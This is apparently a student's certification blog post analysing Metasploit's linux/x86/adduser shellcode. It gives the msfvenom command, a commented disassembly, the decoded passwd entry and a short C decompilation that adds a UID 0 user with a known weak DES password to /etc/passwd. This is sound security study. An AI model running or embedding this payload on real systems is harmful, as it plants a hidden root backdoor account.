Title: SLAE32 - Assignment 5.1
Date: 2022-06-04T10:08:39.000Z


## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

https://www.pentesteracademy.com/course?id=3

Student ID: PA-30398

## Analysis

I chose the following 4 shellcode samples:

<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x86/adduser</td>
<td>Create a new user with UID 0</td>
</tr>
<tr>
<td>linux/x86/shell/reverse_nonx_tcp</td>
<td>Spawn a command shell (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x86/shell_find_tag</td>
<td>Spawn a shell on an established connection (proxy/nat safe)</td>
</tr>
<tr>
<td>linux/x86/shell_reverse_tcp_ipv6</td>
<td>Connect back to attacker and spawn a command shell over IPv6</td>
</tr>
</tbody>
</table>

In this post I'll analyze the shellcode `linux/x86/adduser`.

### NDISASM

To generate the payload:

```bash
msfvenom -p linux/x86/adduser -o shellcode.bin
```

To analyze it with `ndisasm`:

```bash
ndisasm shellcode2.bin -b 32 -p intel
```

It returns the following output (comments are mine though):

```nasm
                            ; ECX = 0
00000000  31C9              xor ecx,ecx

                            ; EBX = 0
00000002  89CB              mov ebx,ecx

                            ; EAX = 70
00000004  6A46              push byte +0x46
00000006  58                pop eax

                            ; call setreuid
00000007  CD80              int 0x80
```

<figcaption class="figure-caption">The shellcode runs the command `setreuid(0, 0)` in order to execute subsequent instructions as **root**</figcaption>

```nasm
                            ; EAX = 5
00000009  6A05              push byte +0x5
0000000B  58                pop eax

                            ; pushes 0x2f6574632f2f70617373776400000000 to the stack
                            ; which is equal to "/etc//passwd"
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f

                            ; store reference to string into EBX
0000001E  89E3              mov ebx,esp

                            ; ECX = 0x401 (1025)
00000020  41                inc ecx
00000021  B504              mov ch,0x4

                            ; syscall open
00000023  CD80              int 0x80
```

<figcaption class="figure-caption">The shellcode calls `open()` on `/etc//passwd` with flags `O_WRONLY` and `O_NOCTTY`</figcaption>

The file must already exist, otherwise the function won't be able to open it.

```nasm
                            ; exchanges the values of EAX and EBX
00000025  93                xchg eax,ebx

                            ; jumps to 0x00000053
00000026  E828000000        call 0x53
```

<figcaption class="figure-caption">After exchanging `EAX` with `EBX`, the shellcode jumps to `0x00000053`</figcaption>

```nasm
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
```

<figcaption class="figure-caption">The bytes from `0x0000002B` to `0x00000052` represent a string. In fact, the last byte is `0x0a` is a newline (`\n`) on Linux systems)</figcaption>

```nasm
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
```

I won't cover the bytes from `0x00000052` to `0x0000005f` as they aren't correct. In this case, `ndisasm` thinks that the byte at `0x00000052` is the opcode for the `OR` instructions, however it's simply a newline.

I had to adjust it manually:

```bash
echo -n '598b51fc6a0458cd806a0158cd80' | xxd -r -p > shellcode2.bin

ndisasm shellcode2.bin -b 32 -p intel
```

Follows the output of `ndisasm`:

```nasm
                            ; store the reference to the string into ECX
00000000  59                pop ecx

                            ; copy the byte stored at ECX-4 into EDX 
00000001  8B51FC            mov edx,[ecx-0x4]

                            ; call the write syscall
00000004  6A04              push byte +0x4
00000006  58                pop eax
00000007  CD80              int 0x80
```

<figcaption class="figure-caption">According to the docs, `EDX` stores the length of the string, so it should be `0x28` (40 chars). The value is the fourth-to-last byte of the instruction stored at the address `0x00000026` (`E828000000`)</figcaption>

After the shellcode retrieves the size of the string to be written, it uses the `write()` syscall to write into the previously opened file, which is overwritten.

```nasm
                            ; call the exit syscall
00000009  6A01              push byte +0x1
0000000B  58                pop eax
0000000C  CD80              int 0x80
```

<figcaption class="figure-caption">The shellcode gracefully terminates its execution</figcaption>

These last two pieces of shellcode simply write the new string inside the previously-opened file: `/etc//passwd`.

The line is the following:

```bash
echo "6D65746173706C6F69743A417A2F6449736A3470344952633A303A303A3A2F3A2F62696E2F73680A" | xxd -r -p

# metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
```

The format is the following:

```txt
USERNAME:HASHED_PASSWORD:UID:GUID:GECOS_INFO:HOME_DIRECTORY:SHELL
```

The password in encrypted with `DES`, which is a weak encryption scheme. The first two characters (`Az`) are the salt, while the other eleven characters are the hash value.

According to the documentation of the module, the password should be `metasploit`.

Once the line is written, a new user with `UID 0` and `GUID 0` (hence identical to `root`), will be added to the machine.

### De-compiling

Since the shellcode it's small, I tried to convert the assembly instructions into a C program, in order to make it easier to understand what's going on:

```cpp
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
  setreuid(0, 0);
  int fd = open("/etc//passwd", O_WRONLY | O_NOCTTY);
  write(fd, "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n", 40);
}
```

<figcaption class="figure-caption">De-compiled code</figcaption>

A brief summary:

<ol><li>it uses `setreuid()` to set "real and effective user IDs of the calling process" (the difference arises when impersonating other users)
- it uses `open()` to open the file `/etc//passwd` (which must already exist) in write mode, so it overwrites all of the contents
- it uses `write()` to write **40 bytes** (the string shown above) inside the file

